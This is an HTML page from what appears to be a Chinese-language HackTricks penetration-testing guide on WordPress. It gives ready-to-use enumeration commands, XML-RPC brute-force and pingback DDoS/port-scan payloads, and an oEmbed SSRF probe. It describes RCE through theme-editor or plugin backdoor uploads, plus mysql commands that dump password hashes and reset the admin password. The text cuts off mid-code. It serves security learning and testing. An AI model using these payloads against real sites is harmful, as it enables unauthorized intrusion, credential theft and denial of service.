<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Wordpress</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../../favicon.svg">
        <link rel="shortcut icon" href="../../favicon.png">
        <link rel="stylesheet" href="../../css/variables.css">
        <link rel="stylesheet" href="../../css/general.css">
        <link rel="stylesheet" href="../../css/chrome.css">
        <link rel="stylesheet" href="../../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../highlight.css">
        <link rel="stylesheet" href="../../tomorrow-night.css">
        <link rel="stylesheet" href="../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="wordpress"><a class="header" href="#wordpress">Wordpress</a></h1>
<p>{% hint style="success" %}
学习与实践 AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks Training AWS Red Team Expert (ARTE)</strong></a><img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习与实践 GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks Training GCP Red Team Expert (GRTE)</strong><img src="../../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>telegram 群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github 仓库提交 PR 分享黑客技巧。</li>
</ul>
</details>
{% endhint %}
<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
<p><br />
使用 <a href="https://trickest.com/?utm_source=hacktricks&amp;utm_medium=text&amp;utm_campaign=ppc&amp;utm_term=trickest&amp;utm_content=wordpress"><strong>Trickest</strong></a> 轻松构建和 <strong>自动化工作流</strong>，由世界上 <strong>最先进</strong> 的社区工具提供支持。<br />
立即获取访问权限：</p>
<p>{% embed url="https://trickest.com/?utm_source=hacktricks&amp;utm_medium=banner&amp;utm_campaign=ppc&amp;utm_content=wordpress" %}</p>
<h2 id="基本信息"><a class="header" href="#基本信息">基本信息</a></h2>
<ul>
<li>
<p><strong>上传的</strong> 文件位于: <code>http://10.10.10.10/wp-content/uploads/2018/08/a.txt</code></p>
</li>
<li>
<p><strong>主题文件可以在 /wp-content/themes/ 中找到，</strong> 所以如果你更改主题的一些 php 文件以获取 RCE，你可能会使用该路径。例如：使用 <strong>theme twentytwelve</strong> 你可以 <strong>访问</strong> <strong>404.php</strong> 文件在: <a href="http://10.11.1.234/wp-content/themes/twentytwelve/404.php"><strong>/wp-content/themes/twentytwelve/404.php</strong></a></p>
</li>
<li>
<p><strong>另一个有用的 URL 可能是:</strong> <a href="http://10.11.1.234/wp-content/themes/twentytwelve/404.php"><strong>/wp-content/themes/default/404.php</strong></a></p>
</li>
<li>
<p>在 <strong>wp-config.php</strong> 中可以找到数据库的 root 密码。</p>
</li>
<li>
<p>默认登录路径检查: <em><strong>/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/</strong></em></p>
</li>
</ul>
<h3 id="主要-wordpress-文件"><a class="header" href="#主要-wordpress-文件"><strong>主要 WordPress 文件</strong></a></h3>
<ul>
<li><code>index.php</code></li>
<li><code>license.txt</code> 包含有用的信息，例如安装的 WordPress 版本。</li>
<li><code>wp-activate.php</code> 用于在设置新 WordPress 网站时的电子邮件激活过程。</li>
<li>登录文件夹（可能被重命名以隐藏）：</li>
<li><code>/wp-admin/login.php</code></li>
<li><code>/wp-admin/wp-login.php</code></li>
<li><code>/login.php</code></li>
<li><code>/wp-login.php</code></li>
<li><code>xmlrpc.php</code> 是一个文件，代表 WordPress 的一个功能，允许数据通过 HTTP 作为传输机制，XML 作为编码机制进行传输。这种类型的通信已被 WordPress <a href="https://developer.wordpress.org/rest-api/reference">REST API</a> 替代。</li>
<li><code>wp-content</code> 文件夹是存储插件和主题的主要目录。</li>
<li><code>wp-content/uploads/</code> 是存储上传到平台的任何文件的目录。</li>
<li><code>wp-includes/</code> 这是存储核心文件的目录，例如证书、字体、JavaScript 文件和小部件。</li>
<li><code>wp-sitemap.xml</code> 在 WordPress 版本 5.5 及更高版本中，WordPress 生成一个包含所有公共帖子和可公开查询的帖子类型和分类法的 sitemap XML 文件。</li>
</ul>
<p><strong>后期利用</strong></p>
<ul>
<li><code>wp-config.php</code> 文件包含 WordPress 连接数据库所需的信息，例如数据库名称、数据库主机、用户名和密码、身份验证密钥和盐，以及数据库表前缀。此配置文件还可以用于激活 DEBUG 模式，这在故障排除时可能很有用。</li>
</ul>
<h3 id="用户权限"><a class="header" href="#用户权限">用户权限</a></h3>
<ul>
<li><strong>管理员</strong></li>
<li><strong>编辑</strong>: 发布和管理他和其他人的帖子</li>
<li><strong>作者</strong>: 发布和管理自己的帖子</li>
<li><strong>贡献者</strong>: 撰写和管理自己的帖子但不能发布</li>
<li><strong>订阅者</strong>: 浏览帖子并编辑他们的个人资料</li>
</ul>
<h2 id="被动枚举"><a class="header" href="#被动枚举"><strong>被动枚举</strong></a></h2>
<h3 id="获取-wordpress-版本"><a class="header" href="#获取-wordpress-版本"><strong>获取 WordPress 版本</strong></a></h3>
<p>检查是否可以找到文件 <code>/license.txt</code> 或 <code>/readme.html</code></p>
<p>在页面的 <strong>源代码</strong> 中（来自 <a href="https://wordpress.org/support/article/pages/">https://wordpress.org/support/article/pages/</a> 的示例）:</p>
<ul>
<li>grep</li>
</ul>
<pre><code class="language-bash">curl https://victim.com/ | grep 'content="WordPress'
</code></pre>
<ul>
<li><code>meta name</code></li>
</ul>
<p><img src="../../.gitbook/assets/image%20(1111).png" alt="" /></p>
<ul>
<li>CSS链接文件</li>
</ul>
<p><img src="../../.gitbook/assets/image%20(533).png" alt="" /></p>
<ul>
<li>JavaScript文件</li>
</ul>
<p><img src="../../.gitbook/assets/image%20(524).png" alt="" /></p>
<h3 id="获取插件"><a class="header" href="#获取插件">获取插件</a></h3>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-bash">curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
</code></pre>
<h3 id="获取主题"><a class="header" href="#获取主题">获取主题</a></h3>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-bash">curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
</code></pre>
<h3 id="提取版本信息"><a class="header" href="#提取版本信息">提取版本信息</a></h3>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-bash">curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

</code></pre>
<p>{% endcode %}</p>
<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
<p><br />
使用 <a href="https://trickest.com/?utm_source=hacktricks&amp;utm_medium=text&amp;utm_campaign=ppc&amp;utm_term=trickest&amp;utm_content=wordpress"><strong>Trickest</strong></a> 轻松构建和 <strong>自动化工作流程</strong>，由世界上 <strong>最先进</strong> 的社区工具提供支持。<br />
立即获取访问权限：</p>
<p>{% embed url="https://trickest.com/?utm_source=hacktricks&amp;utm_medium=banner&amp;utm_campaign=ppc&amp;utm_content=wordpress" %}</p>
<h2 id="主动枚举"><a class="header" href="#主动枚举">主动枚举</a></h2>
<h3 id="插件和主题"><a class="header" href="#插件和主题">插件和主题</a></h3>
<p>您可能无法找到所有可能的插件和主题。为了发现所有这些，您需要 <strong>主动暴力破解插件和主题的列表</strong>（希望对我们来说，有自动化工具包含这些列表）。</p>
<h3 id="用户"><a class="header" href="#用户">用户</a></h3>
<ul>
<li><strong>ID 暴力破解：</strong> 通过暴力破解用户 ID 从 WordPress 网站获取有效用户：</li>
</ul>
<pre><code class="language-bash">curl -s -I -X GET http://blog.example.com/?author=1
</code></pre>
<p>如果响应是 <strong>200</strong> 或 <strong>30X</strong>，这意味着 id 是 <strong>有效</strong> 的。如果响应是 <strong>400</strong>，那么 id 是 <strong>无效</strong> 的。</p>
<ul>
<li><strong>wp-json:</strong> 你也可以通过查询来获取用户的信息：</li>
</ul>
<pre><code class="language-bash">curl http://blog.example.com/wp-json/wp/v2/users
</code></pre>
<p>另一个可以揭示用户信息的 <code>/wp-json/</code> 端点是：</p>
<pre><code class="language-bash">curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
</code></pre>
<p>注意，此端点仅暴露已发布帖子的用户。<strong>仅提供启用此功能的用户的信息</strong>。</p>
<p>还要注意，<strong>/wp-json/wp/v2/pages</strong> 可能会泄露 IP 地址。</p>
<ul>
<li><strong>登录用户名枚举</strong>：在 <strong><code>/wp-login.php</code></strong> 登录时，<strong>消息</strong>在指示的 <strong>用户名是否存在</strong> 时是 <strong>不同的</strong>。</li>
</ul>
<h3 id="xml-rpc"><a class="header" href="#xml-rpc">XML-RPC</a></h3>
<p>如果 <code>xml-rpc.php</code> 处于活动状态，您可以执行凭据暴力破解或利用它对其他资源发起 DoS 攻击。（您可以通过<a href="https://github.com/relarizky/wpxploit">使用这个</a>来自动化此过程，例如）。</p>
<p>要查看它是否处于活动状态，请尝试访问 <em><strong>/xmlrpc.php</strong></em> 并发送此请求：</p>
<p><strong>检查</strong></p>
<pre><code class="language-markup">&lt;methodCall&gt;
&lt;methodName&gt;system.listMethods&lt;/methodName&gt;
&lt;params&gt;&lt;/params&gt;
&lt;/methodCall&gt;
</code></pre>
<p><img src="https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656" alt="" /></p>
<p><strong>凭证暴力破解</strong></p>
<p><strong><code>wp.getUserBlogs</code></strong>、<strong><code>wp.getCategories</code></strong> 或 <strong><code>metaWeblog.getUsersBlogs</code></strong> 是一些可以用来暴力破解凭证的方法。如果你能找到其中任何一个，你可以发送类似于：</p>
<pre><code class="language-markup">&lt;methodCall&gt;
&lt;methodName&gt;wp.getUsersBlogs&lt;/methodName&gt;
&lt;params&gt;
&lt;param&gt;&lt;value&gt;admin&lt;/value&gt;&lt;/param&gt;
&lt;param&gt;&lt;value&gt;pass&lt;/value&gt;&lt;/param&gt;
&lt;/params&gt;
&lt;/methodCall&gt;
</code></pre>
<p>消息 <em>"用户名或密码不正确"</em> 应该出现在 200 代码响应中，如果凭据无效。</p>
<p><img src="../../.gitbook/assets/image%20(107)%20(2)%20(2)%20(2)%20(2)%20(2)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(2)%20(4)%20(1).png" alt="" /></p>
<p><img src="../../.gitbook/assets/image%20(721).png" alt="" /></p>
<p>使用正确的凭据，您可以上传文件。在响应中，路径将出现 (<a href="https://gist.github.com/georgestephanis/5681982">https://gist.github.com/georgestephanis/5681982</a>)</p>
<pre><code class="language-markup">&lt;?xml version='1.0' encoding='utf-8'?&gt;
&lt;methodCall&gt;
&lt;methodName&gt;wp.uploadFile&lt;/methodName&gt;
&lt;params&gt;
&lt;param&gt;&lt;value&gt;&lt;string&gt;1&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;
&lt;param&gt;&lt;value&gt;&lt;string&gt;username&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;
&lt;param&gt;&lt;value&gt;&lt;string&gt;password&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;
&lt;param&gt;
&lt;value&gt;
&lt;struct&gt;
&lt;member&gt;
&lt;name&gt;name&lt;/name&gt;
&lt;value&gt;&lt;string&gt;filename.jpg&lt;/string&gt;&lt;/value&gt;
&lt;/member&gt;
&lt;member&gt;
&lt;name&gt;type&lt;/name&gt;
&lt;value&gt;&lt;string&gt;mime/type&lt;/string&gt;&lt;/value&gt;
&lt;/member&gt;
&lt;member&gt;
&lt;name&gt;bits&lt;/name&gt;
&lt;value&gt;&lt;base64&gt;&lt;![CDATA[---base64-encoded-data---]]&gt;&lt;/base64&gt;&lt;/value&gt;
&lt;/member&gt;
&lt;/struct&gt;
&lt;/value&gt;
&lt;/param&gt;
&lt;/params&gt;
&lt;/methodCall&gt;
</code></pre>
<p>还有一种<strong>更快的方法</strong>可以使用**<code>system.multicall</code>**进行暴力破解凭据，因为您可以在同一请求中尝试多个凭据：</p>
<figure><img src="../../.gitbook/assets/image (628).png" alt=""><figcaption></figcaption></figure>
<p><strong>绕过 2FA</strong></p>
<p>此方法是针对程序而非人类的，并且较旧，因此不支持 2FA。因此，如果您拥有有效的凭据，但主要入口受到 2FA 保护，<strong>您可能能够利用 xmlrpc.php 使用这些凭据登录，从而绕过 2FA</strong>。请注意，您将无法执行通过控制台可以执行的所有操作，但您仍然可能能够达到 RCE，正如 Ippsec 在 <a href="https://www.youtube.com/watch?v=p8mIdm93mfw&amp;t=1130s">https://www.youtube.com/watch?v=p8mIdm93mfw&amp;t=1130s</a> 中解释的那样。</p>
<p><strong>DDoS 或端口扫描</strong></p>
<p>如果您可以在列表中找到方法 <em><strong>pingback.ping</strong></em>，则可以使 Wordpress 向任何主机/端口发送任意请求。<br />
这可以用来请求<strong>成千上万</strong>的 Wordpress <strong>站点</strong>去<strong>访问</strong>一个<strong>位置</strong>（因此在该位置造成<strong>DDoS</strong>）或者您可以用它让<strong>Wordpress</strong>去<strong>扫描</strong>一些内部<strong>网络</strong>（您可以指定任何端口）。</p>
<pre><code class="language-markup">&lt;methodCall&gt;
&lt;methodName&gt;pingback.ping&lt;/methodName&gt;
&lt;params&gt;&lt;param&gt;
&lt;value&gt;&lt;string&gt;http://&lt;YOUR SERVER &gt;:&lt;port&gt;&lt;/string&gt;&lt;/value&gt;
&lt;/param&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;http://&lt;SOME VALID BLOG FROM THE SITE &gt;&lt;/string&gt;
&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;
&lt;/methodCall&gt;
</code></pre>
<p><img src="../../.gitbook/assets/1_JaUYIZF8ZjDGGB7ocsZC-g.png" alt="" /></p>
<p>如果你得到的 <strong>faultCode</strong> 值 <strong>大于</strong> <strong>0</strong> (17)，这意味着端口是开放的。</p>
<p>查看上一节中 <strong><code>system.multicall</code></strong> 的使用，了解如何利用此方法造成 DDoS。</p>
<p><strong>DDoS</strong></p>
<pre><code class="language-markup">&lt;methodCall&gt;
&lt;methodName&gt;pingback.ping&lt;/methodName&gt;
&lt;params&gt;
&lt;param&gt;&lt;value&gt;&lt;string&gt;http://target/&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;
&lt;param&gt;&lt;value&gt;&lt;string&gt;http://yoursite.com/and_some_valid_blog_post_url&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;
&lt;/params&gt;
&lt;/methodCall&gt;
</code></pre>
<p><img src="../../.gitbook/assets/image%20(110).png" alt="" /></p>
<h3 id="wp-cronphp-dos"><a class="header" href="#wp-cronphp-dos">wp-cron.php DoS</a></h3>
<p>此文件通常位于Wordpress站点的根目录下：<strong><code>/wp-cron.php</code></strong><br />
当此文件被<strong>访问</strong>时，会执行一个“<strong>重</strong>”的MySQL <strong>查询</strong>，因此可能被<strong>攻击者</strong>用来<strong>造成****DoS</strong>。<br />
此外，默认情况下，<code>wp-cron.php</code>在每次页面加载时被调用（每当客户端请求任何Wordpress页面时），在高流量网站上可能会导致问题（DoS）。</p>
<p>建议禁用Wp-Cron，并在主机中创建一个真正的cronjob，以定期执行所需的操作（而不造成问题）。</p>
<h3 id="wp-jsonoembed10proxy---ssrf"><a class="header" href="#wp-jsonoembed10proxy---ssrf">/wp-json/oembed/1.0/proxy - SSRF</a></h3>
<p>尝试访问_https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_，Wordpress站点可能会向您发出请求。</p>
<p>当它不起作用时的响应是：</p>
<p><img src="../../.gitbook/assets/image%20(365).png" alt="" /></p>
<h2 id="ssrf"><a class="header" href="#ssrf">SSRF</a></h2>
<p>{% embed url="https://github.com/t0gu/quickpress/blob/master/core/requests.go" %}</p>
<p>此工具检查<strong>methodName: pingback.ping</strong>和路径**/wp-json/oembed/1.0/proxy**，如果存在，它会尝试利用它们。</p>
<h2 id="自动工具"><a class="header" href="#自动工具">自动工具</a></h2>
<pre><code class="language-bash">cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token &lt;API_TOKEN&gt; --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
</code></pre>
<h2 id="通过覆盖一个比特获取访问权限"><a class="header" href="#通过覆盖一个比特获取访问权限">通过覆盖一个比特获取访问权限</a></h2>
<p>这不仅仅是一次真正的攻击，而是一种好奇心。在 CTF <a href="https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man">https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man</a> 中，你可以翻转任何 wordpress 文件的 1 个比特。因此，你可以将文件 <code>/var/www/html/wp-includes/user.php</code> 的位置 <code>5389</code> 翻转为 NOP NOT (<code>!</code>) 操作。</p>
<pre><code class="language-php">if ( ! wp_check_password( $password, $user-&gt;user_pass, $user-&gt;ID ) ) {
return new WP_Error(
</code></pre>
<h2 id="面板-rce"><a class="header" href="#面板-rce"><strong>面板 RCE</strong></a></h2>
<p><strong>修改所用主题的 php（需要管理员凭据）</strong></p>
<p>外观 → 主题编辑器 → 404 模板（在右侧）</p>
<p>将内容更改为 php shell：</p>
<p><img src="../../.gitbook/assets/image%20(384).png" alt="" /></p>
<p>在互联网上搜索如何访问该更新页面。在这种情况下，您必须访问这里: <a href="http://10.11.1.234/wp-content/themes/twentytwelve/404.php">http://10.11.1.234/wp-content/themes/twentytwelve/404.php</a></p>
<h3 id="msf"><a class="header" href="#msf">MSF</a></h3>
<p>您可以使用：</p>
<pre><code class="language-bash">use exploit/unix/webapp/wp_admin_shell_upload
</code></pre>
<p>to get a session.</p>
<h2 id="插件-rce"><a class="header" href="#插件-rce">插件 RCE</a></h2>
<h3 id="php-插件"><a class="header" href="#php-插件">PHP 插件</a></h3>
<p>可能可以将 .php 文件作为插件上传。<br />
使用例如以下方法创建你的 php 后门：</p>
<p><img src="../../.gitbook/assets/image%20(183).png" alt="" /></p>
<p>然后添加一个新插件：</p>
<p><img src="../../.gitbook/assets/image%20(722).png" alt="" /></p>
<p>上传插件并按“立即安装”：</p>
<p><img src="../../.gitbook/assets/image%20(249).png" alt="" /></p>
<p>点击继续：</p>
<p><img src="../../.gitbook/assets/image%20(70).png" alt="" /></p>
<p>这可能看起来没有任何反应，但如果你去媒体，你会看到你的 shell 已上传：</p>
<p><img src="../../.gitbook/assets/image%20(462).png" alt="" /></p>
<p>访问它，你将看到执行反向 shell 的 URL：</p>
<p><img src="../../.gitbook/assets/image%20(1006).png" alt="" /></p>
<h3 id="上传和激活恶意插件"><a class="header" href="#上传和激活恶意插件">上传和激活恶意插件</a></h3>
<p>此方法涉及安装已知存在漏洞的恶意插件，并可以利用该漏洞获取 web shell。此过程通过 WordPress 仪表板进行，如下所示：</p>
<ol>
<li><strong>插件获取</strong>：从像 Exploit DB 这样的来源获取插件，如 <a href="https://www.exploit-db.com/exploits/36374"><strong>这里</strong></a>。</li>
<li><strong>插件安装</strong>：</li>
</ol>
<ul>
<li>导航到 WordPress 仪表板，然后转到 <code>仪表板 &gt; 插件 &gt; 上传插件</code>。</li>
<li>上传下载插件的 zip 文件。</li>
</ul>
<ol start="3">
<li><strong>插件激活</strong>：一旦插件成功安装，必须通过仪表板激活它。</li>
<li><strong>利用</strong>：</li>
</ol>
<ul>
<li>安装并激活插件“reflex-gallery”，可以利用它，因为已知存在漏洞。</li>
<li>Metasploit 框架提供了此漏洞的利用。通过加载适当的模块并执行特定命令，可以建立 meterpreter 会话，从而获得对站点的未经授权访问。</li>
<li>注意，这只是利用 WordPress 网站的众多方法之一。</li>
</ul>
<p>内容包括描述在 WordPress 仪表板中安装和激活插件步骤的视觉辅助工具。然而，重要的是要注意，以这种方式利用漏洞在没有适当授权的情况下是非法和不道德的。此信息应负责任地使用，仅在法律背景下使用，例如在获得明确许可的渗透测试中。</p>
<p><strong>有关更详细的步骤，请查看：</strong> <a href="https://www.hackingarticles.in/wordpress-reverse-shell/"><strong>https://www.hackingarticles.in/wordpress-reverse-shell/</strong></a></p>
<h2 id="从-xss-到-rce"><a class="header" href="#从-xss-到-rce">从 XSS 到 RCE</a></h2>
<ul>
<li><a href="https://github.com/nowak0x01/WPXStrike"><strong>WPXStrike</strong></a>：<em><strong>WPXStrike</strong></em> 是一个旨在将 <strong>跨站脚本 (XSS)</strong> 漏洞升级为 <strong>远程代码执行 (RCE)</strong> 或其他 WordPress 中的关键漏洞的脚本。有关更多信息，请查看 <a href="https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html"><strong>此帖子</strong></a>。它提供对 WordPress 版本 6.X.X、5.X.X 和 4.X.X 的 <strong>支持，并允许：</strong></li>
<li><em><strong>权限提升：</strong></em> 在 WordPress 中创建用户。</li>
<li><em><strong>(RCE) 自定义插件 (后门) 上传：</strong></em> 将自定义插件 (后门) 上传到 WordPress。</li>
<li><em><strong>(RCE) 内置插件编辑：</strong></em> 编辑 WordPress 中的内置插件。</li>
<li><em><strong>(RCE) 内置主题编辑：</strong></em> 编辑 WordPress 中的内置主题。</li>
<li><em><strong>(自定义) 自定义利用：</strong></em> 针对第三方 WordPress 插件/主题的自定义利用。</li>
</ul>
<h2 id="利用后"><a class="header" href="#利用后">利用后</a></h2>
<p>提取用户名和密码：</p>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-bash">mysql -u &lt;USERNAME&gt; --password=&lt;PASSWORD&gt; -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
</code></pre>
<p>{% endcode %}</p>
<p>更改管理员密码：</p>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-bash">mysql -u &lt;USERNAME&gt; --password=&lt;PASSWORD&gt; -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
</code></pre>
<p>{% endcode %}</p>
<h2 id="wordpress-插件渗透测试"><a class="header" href="#wordpress-插件渗透测试">Wordpress 插件渗透测试</a></h2>
<h3 id="攻击面"><a class="header" href="#攻击面">攻击面</a></h3>
<p>了解 Wordpress 插件如何暴露功能是发现其功能漏洞的关键。您可以在以下要点中找到插件可能暴露功能的方式，以及一些易受攻击插件的示例，详见 <a href="https://nowotarski.info/wordpress-nonce-authorization/"><strong>这篇博客文章</strong></a>。</p>
<ul>
<li><strong><code>wp_ajax</code></strong> </li>
</ul>
<p>插件暴露功能的一种方式是通过 AJAX 处理程序。这些处理程序可能包含逻辑、授权或身份验证漏洞。此外，这些功能通常会基于 Wordpress nonce 的存在进行身份验证和授权，而 <strong>任何在 Wordpress 实例中经过身份验证的用户都可能拥有</strong>（与其角色无关）。</p>
<p>这些是可以用来在插件中暴露功能的函数：</p>
<pre><code class="language-php">add_action( 'wp_ajax_action_name', array(&amp;$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&amp;$this, 'function_name'));
</code></pre>
<p><strong>使用 <code>nopriv</code> 使得该端点可以被任何用户访问（甚至是未认证的用户）。</strong></p>
<p>{% hint style="danger" %}
此外，如果该函数只是使用 <code>wp_verify_nonce</code> 检查用户的授权，该函数仅检查用户是否已登录，通常并不检查用户的角色。因此，低权限用户可能会访问高权限的操作。
{% endhint %}</p>
<ul>
<li><strong>REST API</strong></li>
</ul>
<p>还可以通过使用 <code>register_rest_route</code> 函数从 WordPress 注册一个 REST API 来暴露函数：</p>
<pre><code class="language-php">register_rest_route(
$this-&gt;namespace, '/get/', array(
'methods' =&gt; WP_REST_Server::READABLE,
'callback' =&gt; array($this, 'getData'),
